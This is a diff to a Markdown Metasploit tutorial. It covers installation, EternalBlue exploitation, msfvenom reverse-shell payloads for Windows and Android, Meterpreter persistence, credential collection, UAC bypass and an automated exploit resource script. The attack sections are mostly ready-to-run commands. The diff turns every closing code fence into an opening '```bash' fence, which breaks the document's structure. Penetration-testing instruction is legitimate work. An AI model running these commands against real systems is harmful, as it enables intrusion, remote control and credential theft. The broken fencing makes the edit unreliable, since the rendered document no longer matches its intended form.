@@ -3,6 +3,7 @@
 ## Installation
 
 ### Prerequisites
+
 - Linux OS (Kali Linux recommended, which includes Metasploit)
 - Ruby 2.3+
 - PostgreSQL database
@@ -10,54 +11,63 @@
 - Root or sudo access
 
 ### On Kali Linux (Pre-installed)
+
 Metasploit comes pre-installed on Kali Linux. Just start the service:
+
 ```bash
 sudo systemctl start postgresql
 sudo msfdb init
 msfconsole
-```
+```bash
 
 ### On Other Linux Distributions
 
 #### Ubuntu/Debian
+
 ```bash
 curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wss.erb > /tmp/metasploit-framework-wss.erb
 sudo apt-get install postgresql postgresql-contrib
 sudo systemctl start postgresql
 sudo apt-get install metasploit-framework
-```
+```bash
 
 #### Using Git
+
 ```bash
 git clone https://github.com/rapid7/metasploit-framework.git
 cd metasploit-framework
 gem install bundler
 bundle install
-```
+```bash
 
 ### On Windows
-Download the Windows Installer from https://www.metasploit.com/download
+
+Download the Windows Installer from <https://www.metasploit.com/download>
 
 ### Verify Installation
+
 ```bash
 msfconsole --version
-```
+```bash
 
 ## Initial Setup
 
 ### Initialize Database
+
 ```bash
 sudo msfdb init
-```
+```bash
 
 ### Start Metasploit Console
+
 ```bash
 msfconsole
-```
+```bash
 
 ## Basic Commands
 
 ### Information Gathering
+
 ```bash
 # Search for exploits
 search ms17-010
@@ -68,9 +78,10 @@ search type:exploit platform:windows
 # Show exploit details
 show options
 info exploit/windows/smb/ms17_010_eternalblue
-```
+```bash
 
 ### Using an Exploit
+
 ```bash
 # Select an exploit
 use exploit/windows/smb/ms17_010_eternalblue
@@ -87,20 +98,22 @@ options
 # Execute exploit
 run
 exploit
-```
+```bash
 
 ### Payload Generation
+
 ```bash
 # Generate standalone executable
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe
 
 # APK payload for Android
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o payload.apk
-```
+```bash
 
 ## Meterpreter Commands
 
 Once you have a Meterpreter session:
+
 ```bash
 # Get system information
 sysinfo
@@ -131,9 +144,10 @@ migrate [PID]
 
 # Establish persistence
 persistence -X -i 60 -p 4444 -r 192.168.1.10
-```
+```bash
 
 ## Database Commands
+
 ```bash
 # Show database status
 db_status
@@ -149,11 +163,12 @@ vulns
 
 # Show exploited sessions
 sessions
-```
+```bash
 
 ## Scanning and Enumeration
 
 ### Port Scanning
+
 ```bash
 # Use Nmap module
 use auxiliary/scanner/nmap/nmap
@@ -164,9 +179,10 @@ run
 use auxiliary/scanner/smb/smb_version
 set RHOSTS 192.168.1.0/24
 run
-```
+```bash
 
 ### Service Discovery
+
 ```bash
 # FTP Scanner
 use auxiliary/scanner/ftp/ftp_version
@@ -176,11 +192,12 @@ use auxiliary/scanner/ssh/ssh_version
 
 # HTTP Scanner
 use auxiliary/scanner/http/http_version
-```
+```bash
 
 ## Post-Exploitation
 
 ### Information Gathering
+
 ```bash
 # Get system information
 run post/windows/gather/enum_applications
@@ -190,48 +207,54 @@ run post/windows/gather/credentials/credential_collector
 
 # Enumerate shares
 run post/windows/gather/enum_shares
-```
+```bash
 
 ### Privilege Escalation
+
 ```bash
 # Bypass UAC
 use exploit/windows/local/bypassuac_eventvwr
 
 # Token impersonation
 getsystem
-```
+```bash
 
 ## Common Exploitation Workflow
 
 ### Step 1: Reconnaissance
+
 ```bash
 use auxiliary/scanner/smb/smb_version
 set RHOSTS 192.168.1.100
 run
-```
+```bash
 
 ### Step 2: Vulnerability Discovery
+
 ```bash
 search ms17-010
-```
+```bash
 
 ### Step 3: Exploitation
+
 ```bash
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS 192.168.1.100
 set LHOST 192.168.1.10
 exploit
-```
+```bash
 
 ### Step 4: Post-Exploitation
+
 ```bash
 getsystem
 run post/windows/gather/enum_applications
-```
+```bash
 
 ## Resource Scripts
 
 Create automation scripts in Ruby:
+
 ```ruby
 # exploit.rc
 use exploit/windows/smb/ms17_010_eternalblue
@@ -239,14 +262,16 @@ set RHOSTS 192.168.1.100
 set LHOST 192.168.1.10
 set PAYLOAD windows/meterpreter/reverse_tcp
 exploit
-```
+```bash
 
 Run the script:
+
 ```bash
 msfconsole -r exploit.rc
-```
+```bash
 
 ## Best Practices
+
 1. Always get written permission before testing
 2. Use separate networks for testing
 3. Keep Metasploit updated
@@ -259,16 +284,18 @@ msfconsole -r exploit.rc
 10. Follow ethical guidelines
 
 ## Updating Metasploit
+
 ```bash
 sudo apt-get update
 sudo apt-get upgrade metasploit-framework
 
 # Or via msfconsole
 msfupdate
-```
+```bash
 
 ## Useful Resources
-- Exploit Database: https://www.exploit-db.com
-- Rapid7 Blog: https://blog.rapid7.com
-- Community Modules: https://github.com/rapid7/metasploit-framework/tree/master/modules
-- Module Development: https://docs.metasploit.com/display/MDT/Module+Development
+
+- Exploit Database: <https://www.exploit-db.com>
+- Rapid7 Blog: <https://blog.rapid7.com>
+- Community Modules: <https://github.com/rapid7/metasploit-framework/tree/master/modules>
+- Module Development: <https://docs.metasploit.com/display/MDT/Module+Development>
